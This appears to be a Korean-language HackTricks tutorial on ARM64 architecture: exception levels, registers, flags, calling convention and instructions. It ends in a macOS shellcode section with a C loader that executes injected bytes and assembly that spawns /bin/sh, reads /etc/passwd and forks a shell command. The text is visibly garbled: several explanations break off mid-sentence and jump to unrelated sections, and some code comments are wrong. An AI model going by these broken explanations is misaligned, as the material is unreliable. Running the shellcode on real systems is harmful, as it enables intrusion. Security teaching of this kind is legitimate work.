# ARM64v8 소개

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## **예외 레벨 - EL (ARM64v8)**

ARMv8 아키텍처에서 실행 레벨인 예외 레벨 (EL)은 실행 환경의 권한 수준과 기능을 정의합니다. EL0부터 EL3까지 총 네 가지 예외 레벨이 있으며 각각 다른 목적으로 사용됩니다:

1. **EL0 - 사용자 모드**:
* 이는 가장 낮은 권한 수준으로 일반 응용 프로그램 코드를 실행하는 데 사용됩니다.
* EL0에서 실행되는 응용 프로그램은 서로 및 시스템 소프트웨어로부터 격리되어 보안과 안정성을 향상시킵니다.
2. **EL1 - 운영 체제 커널 모드**:
* 대부분의 운영 체제 커널은 이 수준에서 실행됩니다.
* EL1은 EL0보다 더 많은 권한을 가지며 시스템 리소스에 액세스할 수 있지만 시스템 무결성을 보장하기 위해 일부 제한이 있습니다.
3. **EL2 - 하이퍼바이저 모드**:
* 이 수준은 가상화에 사용됩니다. EL2에서 실행되는 하이퍼바이저는 동일한 물리 하드웨어에서 실행되는 여러 운영 체제 (각각의 EL1)를 관리할 수 있습니다.
* EL2는 가상화 환경의 격리 및 제어 기능을 제공합니다.
4. **EL3 - 보안 모니터 모드**:
* 이는 가장 높은 권한 수준으로 일반적으로 안전한 부팅 및 신뢰할 수 있는 실행 환경에 사용됩니다.
* EL3는 안전 및 비안전 상태 간의 액세스를 관리하고 제어할 수 있습니다 (예: 안전한 부팅, 신뢰할 수 있는 운영 체제 등).

이러한 수준의 사용은 사용자 응용 프로그램부터 가장 높은 권한을 가진 시스템 소프트웨어까지 시스템의 다양한 측면을 구조화하고 안전하게 관리하는 데 도움이 됩니다. ARMv8의 권한 수준 접근 방식은 다른 시스템 구성 요소를 효과적으로 격리하여 시스템의 보안성과 견고성을 향상시킵니다.

## **레지스터 (ARM64v8)**

ARM64에는 `x0`에서 `x30`까지 레이블이 지정된 **31개의 범용 레지스터**가 있습니다. 각 레지스터는 **64비트** (8바이트) 값을 저장할 수 있습니다. 32비트 값만 필요한 작업에 대해서는 동일한 레지스터를 `w0`에서 `w30`까지의 이름을 사용하여 32비트 모드로 액세스할 수 있습니다.

1. **`x0`**에서 **`x7`**까지 - 이들은 일반적으로 스크래치 레지스터로 사용되며 서브루틴에 매개변수를 전달하는 데 사용됩니다.
* **`x0`**은 함수의 반환 데이터도 운반합니다.
2. **`x8`** - Linux 커널에서 `x8`은 `svc` 명령어의 시스템 호출 번호로 사용됩니다. **macOS에서는 x16이 사용됩니다!**
3. **`x9`**에서 **`x15`**까지 - 추가적인 임시 레지스터로서 주로 로컬 변수에 사용됩니다.
4. **`x16`**과 **`x17`** - **함수 내부 호출 레지스터**. 즉시 값에 대한 임시 레지스터입니다. 또한 간접 함수 호출 및 PLT (Procedure Linkage Table) 스텁에 사용됩니다.
* **`x16`**은 **macOS**에서 **`svc`** 명령어의 **시스템 호출 번호**로 사용됩니다.
5. **`x18`** - **플랫폼 레지스터**. 일반적인 목적으로 사용될 수 있지만 일부 플랫폼에서는 이 레지스터가 플랫폼별 용도로 예약되어 있습니다. Windows의 현재 스레드 환경 블록에 대한 포인터 또는 Linux 커널에서 현재 실행 중인 작업 구조체를 가리키는 포인터입니다.
6. **`x19`**에서 **`x28`**까지 - 이들은 호출자가 호출자를 위해 이들 레지스터의 값을 보존해야 하므로 호출자가 이전으로 돌아가기 전에 스택에 저장되고 복구되어야 하는 callee-saved 레지스터입니다.
7. **`x29`** - 스택 프레임을 추적하기 위한 **프레임 포인터**입니다. 함수 호출로 인해 새로운 스택 프레임이 생성되면 **`x29`** 레지스터가 **스택에 저장**되고 **새로운** 프레임 포인터 주소 (**`sp`** 주소)가 **이 레지스터에 저장**됩니다.
* 이 레지스터는 **일반적인 목적 레지스터**로 사용될 수도 있지만 일반적으로 **로컬 변수**를 참조하는 데 사용됩니다.
8. **`x30`** 또는 **`lr`** - **링크 레지스터**. `BL` (Branch with Link) 또는 `BLR` (Branch with Link to Register) 명령어가 실행될 때 **`pc`** 값을 이 레지스터에 저장하여 **리턴 주소**를 보유합니다.
* 다른 레지스터와 마찬가지로 사용할 수도 있습니다.
9. **`sp`** - **스택 포인터**, 스택의 맨 위를 추적하는 데 사용됩니다.
* **`sp`** 값은 항상 적어도 **
### **PSTATE**

**PSTATE**에는 여러 프로세스 구성 요소가 직렬화되어 운영 체제에서 볼 수 있는 **`SPSR_ELx`** 특수 레지스터에 저장됩니다. 여기서 X는 트리거된 예외의 **권한 수준**입니다(이를 통해 예외가 종료될 때 프로세스 상태를 복구할 수 있습니다).\
다음은 접근 가능한 필드입니다:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* **`N`**, **`Z`**, **`C`**, **`V`** 조건 플래그:
* **`N`**은 연산 결과가 음수임을 의미합니다.
* **`Z`**는 연산 결과가 0임을 의미합니다.
* **`C`**는 연산이 캐리됨을 의미합니다.
* **`V`**는 연산 결과가 부호 오버플로우임을 의미합니다:
* 두 양수의 합은 음수 결과를 낳습니다.
* 두 음수의 합은 양수 결과를 낳습니다.
* 뺄셈에서 큰 음수가 작은 양수에서 뺄 때(또는 그 반대의 경우) 결과가 주어진 비트 크기의 범위 내에 표현될 수 없는 경우입니다.

{% hint style="warning" %}
모든 명령은 이러한 플래그를 업데이트하지 않습니다. **`CMP`** 또는 **`TST`**와 같은 일부 명령은 업데이트하며, **`ADDS`**와 같은 s 접미사가 있는 다른 명령도 업데이트합니다.
{% endhint %}

* 현재 **레지스터 너비 (`nRW`) 플래그**: 플래그가 값 0을 가지면 프로그램은 재개되면서 AArch64 실행 상태에서 실행됩니다.
* 현재 **예외 수준** (**`EL`**): EL0에서 실행되는 일반 프로그램은 값 0을 가집니다.
* **단계별 실행** 플래그 (**`SS`**): 디버거가 단계별로 실행하기 위해 예외를 통해 **`SPSR_ELx`** 내부의 SS 플래그를 1로 설정하는 데 사용됩니다. 프로그램은 한 단계를 실행하고 단계별 예외를 발생시킵니다.
* **잘못된 예외** 상태 플래그 (**`IL`**): 특권 소프트웨어가 잘못된 예외 수준 전송을 수행할 때 이 플래그가 1로 설정되고 프로세서는 잘못된 상태 예외를 트리거합니다.
* **`DAIF`** 플래그: 이러한 플래그를 사용하여 특권 프로그램이 특정 외부 예외를 선택적으로 마스크할 수 있습니다.
* **A**가 1이면 **비동기 중단**이 트리거됩니다. **`I`**는 외부 하드웨어 **인터럽트 요청** (IRQ)에 응답하도록 구성하고, F는 **빠른 인터럽트 요청** (FIR)과 관련이 있습니다.
* **스택 포인터 선택** 플래그 (**`SPS`**): EL1 이상에서 실행되는 특권 프로그램은 자체 스택 포인터 레지스터와 사용자 모델 스택 포인터 레지스터(예: `SP_EL1` 및 `EL0` 사이)를 교환할 수 있습니다. 이 교환은 **`SPSel`** 특수 레지스터에 쓰기를 통해 수행됩니다. 이는 EL0에서 수행할 수 없습니다.

## **호출 규약 (ARM64v8)**

ARM64 호출 규약은 함수의 **첫 번째 여덟 개의 매개변수**가 **`x0`**에서 **`x7`** 레지스터를 통해 전달되어야 함을 지정합니다. **추가적인** 매개변수는 **스택**에 전달됩니다. **반환 값**은 레지스터 **`x0`**에 반환되거나 **128비트인 경우** **`x1`**에도 반환됩니다. **`x19`**에서 **`x30`** 및 **`sp`** 레지스터는 함수 호출 간에 **보존**되어야 합니다.

어셈블리에서 함수를 읽을 때 **함수 프롤로그와 에필로그**를 찾으세요. **프롤로그**는 일반적으로 **프레임 포인터 (`x29`)를 저장**, **새 프레임 포인터를 설정**하고 **스택 공간을 할당**하는 것을 포함합니다. **에필로그**는 일반적으로 **저장된 프레임 포인터를 복원**하고 함수에서 **반환**하는 것을 포함합니다.

### Swift에서의 호출 규약

Swift에는 자체 **호출 규약**이 있으며 [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)에서 찾을 수 있습니다.

## **일반적인 명령어 (ARM64v8)**

ARM64 명령어는 일반적으로 **`opcode dst, src1, src2`** 형식을 가지며, 여기서 **`opcode`**는 수행할 **연산**(`add`, `sub`, `mov` 등)을 나타내고, **`dst`**는 결과가 저장될 **대상** 레지스터이고, **`src1`**과 **`src2`**는 **소스** 레지스터입니다. 소스 레지스터 대신 즉시 값도 사용할 수 있습니다.

* **`mov`**: 한 **레지스터**에서 다른 **레지스터**로 값을 **이동**합니다.
* 예시: `mov x0, x1` — 이는 `x1`의 값을 `x0`로 이동합니다.
* **`ldr`**: **메모리**에서 **값을 로드**하여 **레지스터**에 저장합니다.
* 예시: `ldr x0, [x1]` — 이는 `x1`이 가리키는 메모리 위치에서 값을 `x0`에 로드합니다.
* **`str`**: **레지스터**의 값을 **메모리**에 **저장**합니다.
* 예시: `str x0, [x1]` — 이는 `x0`의 값을 `x1`이 가리키는 메모리 위치에 저장합니다.
* **`ldp`**: **레지스터 쌍 로드**. 이 명령은 **연속적인 메모리** 위치에서 **두 개의 레지스터**를 **로드**합니다. 메모리 주소는 일반적으로 다른 레지스터의 값에 오프셋을 더하여 형성됩니다.
* 예시: `ldp x0,
* **`bfm`**: **비트 필드 이동**, 이러한 연산은 값을 복사하여 다른 위치에 배치합니다. **`#s`**는 가장 왼쪽 비트 위치를 지정하고 **`#r`**은 오른쪽으로 회전할 양을 지정합니다.
* 비트 필드 이동: `BFM Xd, Xn, #r`
* 부호 있는 비트 필드 이동: `SBFM Xd, Xn, #r, #s`
* 부호 없는 비트 필드 이동: `UBFM Xd, Xn, #r, #s`
* **비트 필드 추출 및 삽입:** 레지스터에서 비트 필드를 복사하여 다른 레지스터에 복사합니다.
* **`BFI X1, X2, #3, #4`** X2의 3번째 비트부터 4개의 비트를 X1에 삽입합니다.
* **`BFXIL X1, X2, #3, #4`** X2의 3번째 비트부터 4개의 비트를 추출하여 X1에 복사합니다.
* **`SBFIZ X1, X2, #3, #4`** X2에서 4개의 비트를 추출하고 X1의 3번째 비트 위치부터 삽입하며 오른쪽 비트를 0으로 설정합니다.
* **`SBFX X1, X2, #3, #4`** X2에서 3번째 비트부터 4개의 비트를 추출하고 부호를 확장하여 결과를 X1에 저장합니다.
* **`UBFIZ X1, X2, #3, #4`** X2에서 4개의 비트를 추출하고 X1의 3번째 비트 위치부터 삽입하며 오른쪽 비트를 0으로 설정합니다.
* **`UBFX X1, X2, #3, #4`** X2에서 3번째 비트부터 4개의 비트를 추출하고 0으로 확장된 결과를 X1에 저장합니다.
* **X로 확장하기**: 값을 확장하여 연산을 수행할 수 있도록 부호를 확장합니다 (또는 부호 없는 버전에서는 0을 추가합니다).
* **`SXTB X1, W2`** W2에서 X1로 바이트의 부호를 확장합니다 (`W2`는 `X2`의 절반입니다) 64비트를 채우기 위해
* **`SXTH X1, W2`** W2에서 X1로 16비트 숫자의 부호를 확장합니다 64비트를 채우기 위해
* **`SXTW X1, W2`** W2에서 X1로 바이트의 부호를 확장합니다 64비트를 채우기 위해
* **`UXTB X1, W2`** W2에서 X1로 바이트에 0을 추가하여 64비트를 채웁니다
* **`extr`**: 지정된 **두 레지스터 쌍에서 비트를 추출**합니다.
* 예: `EXTR W3, W2, W1, #3` 이는 W1+W2를 연결하고 W2의 3번째 비트부터 W1의 3번째 비트까지 가져와 W3에 저장합니다.
* **`bl`**: **링크가 있는 분기**, **서브루틴을 호출**하는 데 사용됩니다. **`x30`**에 **복귀 주소를 저장**합니다.
* 예: `bl myFunction` — 이는 함수 `myFunction`을 호출하고 반환 주소를 `x30`에 저장합니다.
* **`blr`**: **레지스터로 링크가 있는 분기**, **레지스터에 지정된 대상**의 **서브루틴을 호출**하는 데 사용됩니다. **`x30`**에 **복귀 주소를 저장**합니다.
* 예: `blr x1` — 이는 `x1`에 포함된 주소를 가진 함수를 호출하고 반환 주소를 `x30`에 저장합니다.
* **`ret`**: **서브루틴에서 반환**, 일반적으로 **`x30`**의 주소를 사용합니다.
* 예: `ret` — 현재 서브루틴에서 `x30`의 반환 주소를 사용하여 반환합니다.
* **`cmp`**: 두 레지스터를 **비교**하고 조건 플래그를 설정합니다. 목적 레지스터를 제로 레지스터로 설정하는 **`subs`**의 별칭입니다. `m == n`인지 알 수 있는 유용한 명령입니다.
* **`subs`**와 **동일한 구문을 지원**합니다.
* 예: `cmp x0, x1` — 이는 `x0`와 `x1`의 값을 비교하고 조건 플래그를 설정합니다.
* **`cmn`**: **음수 비교** 연산. 이 경우 **`adds`**의 별칭이며 동일한 구문을 지원합니다. `m == -n`인지 알 수 있는 유용한 명령입니다.
* **tst**: 레지스터의 값 중 하나가 1인지 확인합니다 (결과를 어디에도 저장하지 않고 ANDS와 같이 작동합니다).
* 예: `tst X1, #7` X1의 마지막 3비트 중 하나가 1인지 확인합니다.
* **`b.eq`**: **같으면 분기**, 이전의 `cmp` 명령을 기반으로 합니다.
* 예: `b.eq label` — 이전의 `cmp` 명령에서 두 값이 동일한 경우 `label`로 이동합니다.
* **`b.ne`**: **같지 않으면 분기**. 이 명령은 조건 플래그를 확인하고 (이전 비교 명령에 의해 설정됨) 비교한 값이 같지 않으면 레이블이나 주소로 분기합니다.
* 예: `cmp x0, x1` 명령 후 `b.ne label` — `x0`와 `x1`의 값이 같지 않으면 `label`로 이동합니다.
* **`cbz`**: **0일 때 분기**. 이 명령은 레지스터와 0을 비교하고 같으면 레이블이나 주소로 분기합니다.
* 예: `cbz x0, label` — `x0`의 값이 0이면 `label`로 이동합니다.
* **`cbnz`**: **0이 아닐 때 분기**. 이 명령은 레지스터와 0을 비교하고 같지 않으면 레이블이나 주소로 분기합니다.
* 예: `cbnz x0, label` — `x0`의 값이 0이 아니면 `label`로 이동합니다.
* **`adrp`**: 심볼의 **페이지 주소를 계산**하고 레지스터에 저장합니다.
* 예: `adrp x0, symbol` — `symbol`의 페이지 주소를 계산하여 `x0`에 저장합니다.
* **`ldrsw`**: 메모리에서 **부호 있는 32비트** 값을 **로드**하고 64비트로 확장합니다.
* 예: `ldrsw x0, [x1]` — `x1`이 가리키는 메모리 위치에서 부호 있는 32비트 값을 로드하고 64비트로 확장하여 `x0`에 저장합니다.
* **`stur`**: 레지스터 값을 메모리 위치에 저장합니다. 다른 레지스터로부터의 오프셋을 사용합니다.
* 예: `stur x0, [x1, #4]` — `x1`에 현재 주소보다 4바이트 큰 메모리 주소에 `x0`의 값을 저장합니다.
* **`svc`** : **시스템 호출**을 수행합니다. "Supervisor Call"의 약자입니다. 프로세서가 이 명령을 실행하면 사용자 모드에서 커널 모드로 전환하고 커널의 시스템 호출 처리 코드가 있는 메모리의 특정 위치로 이동합니다.
*   예:

```armasm
mov x8, 93  ; 시스템 호출 번호 93을 레지스터 x8에 로드합니다.
mov x0, 0   ; 종료 상태 코드 0을 레지스터 x0에 로드합니다.
svc 0       ; 시스템 호출을 수행합니다.
```
### **함수 프롤로그**

1. **링크 레지스터와 프레임 포인터를 스택에 저장**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; x29과 x30을 스택에 저장하고 스택 포인터를 감소시킴
```
{% endcode %}
2. **새로운 프레임 포인터 설정**: `mov x29, sp` (현재 함수에 대한 새로운 프레임 포인터 설정)
3. **로컬 변수를 위한 스택에 공간 할당** (필요한 경우): `sub sp, sp, <size>` (<size>는 필요한 바이트 수)

### **함수 에필로그**

1. **로컬 변수 해제 (할당된 경우)**: `add sp, sp, <size>`
2. **링크 레지스터와 프레임 포인터 복원**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Return**: `ret` (링크 레지스터에 있는 주소를 사용하여 호출자에게 제어를 반환합니다)

## AARCH32 실행 상태

Armv8-A는 32비트 프로그램의 실행을 지원합니다. **AArch32**는 **두 개의 명령어 집합**인 **`A32`**와 **`T32`** 중 하나로 실행될 수 있으며 **`interworking`**을 통해 이들 사이를 전환할 수 있습니다.\
**특권을 가진** 64비트 프로그램은 낮은 특권 수준의 32비트로의 예외 수준 전환을 실행함으로써 **32비트 프로그램의 실행을 예약**할 수 있습니다.\
64비트에서 32비트로의 전환은 예외 수준의 낮은 부분에서 발생합니다(예: EL1에서 64비트 프로그램이 EL0에서 실행되는 프로그램을 트리거하는 경우). 이는 **`AArch32`** 프로세스 스레드가 실행 준비가 되었을 때 **`SPSR_ELx`** 특수 레지스터의 **비트 4를 1로 설정**하여 수행되며, 나머지 `SPSR_ELx`는 **`AArch32`** 프로그램의 CPSR을 저장합니다. 그런 다음, 특권 프로세스는 **`ERET`** 명령을 호출하여 프로세서가 **`AArch32`**로 전환되고 CPSR에 따라 A32 또는 T32로 진입합니다.

**`interworking`**은 CPSR의 J 및 T 비트를 사용하여 수행됩니다. `J=0` 및 `T=0`은 **`A32`**를 의미하며, `J=0` 및 `T=1`은 **T32**를 의미합니다. 이는 기본적으로 명령어 집합이 T32임을 나타내기 위해 **가장 낮은 비트를 1로 설정**하는 것을 의미합니다.\
이는 **interworking 분기 명령어**를 통해 설정되지만, PC가 대상 레지스터로 설정될 때 다른 명령어로 직접 설정될 수도 있습니다. 예시:

다른 예시:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### 레지스터

32비트 레지스터(r0-r15)가 16개 있습니다. r0부터 r14까지는 **어떤 작업에나 사용**할 수 있지만, 일부는 일반적으로 예약되어 있습니다:

* **`r15`**: 프로그램 카운터 (항상). 다음 명령의 주소를 포함합니다. A32에서는 현재 + 8, T32에서는 현재 + 4입니다.
* **`r11`**: 프레임 포인터
* **`r12`**: 프로시저 간 호출 레지스터
* **`r13`**: 스택 포인터
* **`r14`**: 링크 레지스터

또한, 레지스터는 **`은행화된 레지스터`**에 백업됩니다. 이는 예외 처리 및 권한 있는 작업에서 **빠른 컨텍스트 전환**을 수행하기 위해 레지스터 값을 저장하는 위치입니다. 이를 위해 예외가 발생하는 프로세서 모드의 `CPSR`에서 프로세서 상태를 `SPSR`로 저장합니다. 예외가 반환되면 `CPSR`은 `SPSR`에서 복원됩니다.

### CPSR - 현재 프로그램 상태 레지스터

AArch32에서 CPSR은 AArch64의 **`PSTATE`**와 유사하게 작동하며, 예외가 발생하여 나중에 실행을 복원하기 위해 **`SPSR_ELx`**에 저장됩니다:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

필드는 몇 가지 그룹으로 나뉩니다:

* 응용 프로그램 프로그램 상태 레지스터 (APSR): 산술 플래그 및 EL0에서 접근 가능
* 실행 상태 레지스터: 프로세스 동작 (운영 체제에 의해 관리됨).

#### 응용 프로그램 프로그램 상태 레지스터 (APSR)

* **`N`**, **`Z`**, **`C`**, **`V`** 플래그 (AArch64와 동일)
* **`Q`** 플래그: 특수 포화 산술 명령어 실행 중에 **정수 포화가 발생**하면 1로 설정됩니다. 한 번 **1로 설정되면** 수동으로 0으로 설정될 때까지 유지됩니다. 또한, 그 값을 암묵적으로 확인하는 명령어는 없으며, 수동으로 읽어야 합니다.
* **`GE`** (크거나 같음) 플래그: "병렬 덧셈" 및 "병렬 뺄셈"과 같은 SIMD (단일 명령어, 다중 데이터) 작업에 사용됩니다. 이러한 작업은 하나의 명령어로 여러 데이터 포인트를 처리할 수 있습니다.

예를 들어, **`UADD8`** 명령은 병렬로 4쌍의 바이트(두 개의 32비트 피연산자에서)를 더하고 결과를 32비트 레지스터에 저장합니다. 그런 다음 이러한 결과에 기반하여 **`APSR`의 `GE` 플래그를 설정**합니다. 각 GE 플래그는 바이트 덧셈 중 하나에 해당하며, 해당 바이트 쌍에 대한 덧셈이 **오버플로**되었는지 여부를 나타냅니다.

**`SEL`** 명령은 이러한 GE 플래그를 사용하여 조건부 작업을 수행합니다.

#### 실행 상태 레지스터

* **`J`** 및 **`T`** 비트: **`J`**는 0이어야 하며, **`T`**가 0이면 A32 명령 세트를 사용하고, 1이면 T32를 사용합니다.
* **IT 블록 상태 레지스터** (`ITSTATE`): 이는 10-15 및 25-26 비트입니다. **`IT`** 접두사 그룹 내의 명령에 대한 조건을 저장합니다.
* **`E`** 비트: **엔디안**을 나타냅니다.
* **모드 및 예외 마스크 비트** (0-4): 현재 실행 상태를 결정합니다. 5번째 비트는 프로그램이 32비트(1) 또는 64비트(0)로 실행되는지를 나타냅니다. 다른 4개는 현재 사용 중인 **예외 모드**를 나타냅니다(예외가 발생하고 처리 중일 때). 숫자 집합은 이 처리 중에 다른 예외가 트리거될 경우 **현재 우선 순위**를 나타냅니다.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

* **`AIF`**: 특정 예외는 비트 **`A`**, `I`, `F`를 사용하여 비활성화할 수 있습니다. **`A`**가 1이면 **비동기 중단**이 트리거됩니다. **`I`**는 외부 하드웨어 **인터럽트 요청** (IRQ)에 응답하도록 구성하며, F는 **빠른 인터럽트 요청** (FIR)과 관련이 있습니다.

## macOS

### BSD 시스콜

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)를 확인하세요. BSD 시스콜은 **x16 > 0**일 것입니다.

### Mach Traps

[**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html)를 확인하세요. Mach traps는 **x16 < 0**이므로 이전 목록의 숫자를 **음수**로 호출해야 합니다. **`_kernelrpc_mach_vm_allocate_trap`**은 **`-10`**입니다.

또한, 이러한 (및 BSD) 시스콜을 호출하는 방법을 찾기 위해 디스어셈블러에서 **`libsystem_kernel.dylib`**를 확인할 수 있습니다.
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
때로는 **`libsystem_kernel.dylib`**의 **디컴파일된** 코드를 확인하는 것이 **소스 코드**를 확인하는 것보다 쉽습니다. 왜냐하면 여러 syscalls (BSD 및 Mach)의 코드는 스크립트를 통해 생성되기 때문에 (소스 코드의 주석을 확인하세요), dylib에서 호출되는 내용을 찾을 수 있기 때문입니다.
{% endhint %}

### 쉘코드

컴파일하기 위해:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
바이트를 추출하려면:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>쉘코드를 테스트하기 위한 C 코드</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### 쉘

[**여기**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)에서 가져온 내용이며 설명되어 있습니다.

{% tabs %}
{% tab title="adr를 사용한 경우" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="스택을 사용하여" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### cat으로 읽기

목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`를 실행하는 것이므로, 두 번째 인자 (x1)는 매개변수의 배열입니다 (메모리에서는 주소의 스택을 의미합니다).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### 메인 프로세스가 종료되지 않도록 포크에서 sh를 사용하여 명령 실행하기
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
